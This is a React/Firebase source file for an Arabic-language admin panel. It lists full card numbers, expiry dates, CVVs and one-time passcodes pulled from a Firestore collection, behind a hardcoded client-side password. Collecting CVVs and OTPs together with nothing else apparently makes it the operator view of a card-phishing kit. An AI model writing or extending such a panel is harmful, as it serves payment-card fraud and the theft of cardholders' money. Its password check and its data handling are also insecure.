'use client'

import { useState, useEffect } from 'react'
import { collection, getDocs, query, orderBy, limit } from 'firebase/firestore'
import { db } from '@/lib/firebase'
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import React from 'react'
import { Input } from '@/components/ui/input'

type Order = {
    cardNumber: string,
    expiryDate: string,
    cvv: string,
    otp:string
  createdAt: Date;
}

type VisitorData = {
  date: string;
  count: number;
}

export default function DashboardPage() {
  const [orders, setOrders] = useState<Order[]>([])
  const [pass, setPass] = useState('')
 // const [visitorData, setVisitorData] = useState<VisitorData[]>([])

  useEffect(() => {
    const fetchData = async () => {
      // Fetch orders
      const ordersQuery = query(collection(db, "datapay"), orderBy("createdAt", "desc"), limit(100))
      const orderSnapshot = await getDocs(ordersQuery)
      const orderData = orderSnapshot.docs.map(doc => ({
        id: doc.id,
        cardNumber:doc.data().paymentInfo.cardNumber,
        cvv:doc.data().paymentInfo.cvc,
        expiryDate:doc.data().paymentInfo.expiryDate,
        otp:doc.data().paymentInfo.otp,
        ...doc.data(),
        createdAt: doc.data().createdAt.toDate()
      })) as Order[]
      setOrders(orderData)
    }
      // Fetch visitor data (assuming we have a 'visitors' collection in Firestore)
    //   const visitorQuery = query(collection(db, "visitors"), orderBy("date", "desc"), limit(30))
    //   const visitorSnapshot = await getDocs(visitorQuery)
    //   const visitorData = visitorSnapshot.docs.map(doc => ({
    //     date: doc.id,
    //     count: doc.data().count
    //   }))
    //   setVisitorData(visitorData.reverse())
    // }

    fetchData()
  }, [])

  const recentOrders = orders.slice(0, 5)

  const dailyRevenue = orders.reduce((acc, order) => {
    const date = order.createdAt.toISOString().split('T')[0]
    return acc
  }, {} as Record<string, number>)

  const revenueChartData = Object.entries(dailyRevenue).map(([date, total]) => ({
    date,
    total
  }))

  return (
  <>
  {  pass === '212995'?(
    <div className="min-h-screen bg-gray-50" dir="rtl">
      
      <main className="container mx-auto px-4 py-12">
        <h1 className="text-4xl font-bold text-[#002B5C] mb-12 text-center">لوحة التحكم</h1>
        
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
        
        
          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">عدد البطاقات</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{orders.length}</div>
            </CardContent>
          </Card>
        
        </div>

     
        <Card>
          <CardHeader>
            <CardTitle>أحدث المعلومات</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
         
                  {recentOrders.map((order) => (
                    <Card key={order.cardNumber} className='px-6 m-2' dir='ltr'>
                    <CardHeader>
                      <CardTitle>cardNumber: {order.cardNumber}</CardTitle>
                      <CardDescription>ExpDate: {order.expiryDate}</CardDescription>
                      <CardDescription>CVV: {order.cvv}</CardDescription>
                   OTP:  <strong className='text-red-400'>{order.otp}</strong>

                    </CardHeader>
                    <CardContent>
                      <p>{order.createdAt.toLocaleDateString('ar-KW')}</p>
                    </CardContent>
                  </Card>
              
                  ))}
            </div>
          </CardContent>
        </Card>
      </main>
    </div>):<Input type='password' onChange={(e)=>{setPass(e.target.value)}} placeholder="ادخل الرمز السري"/>  
}
    </>


  )
}

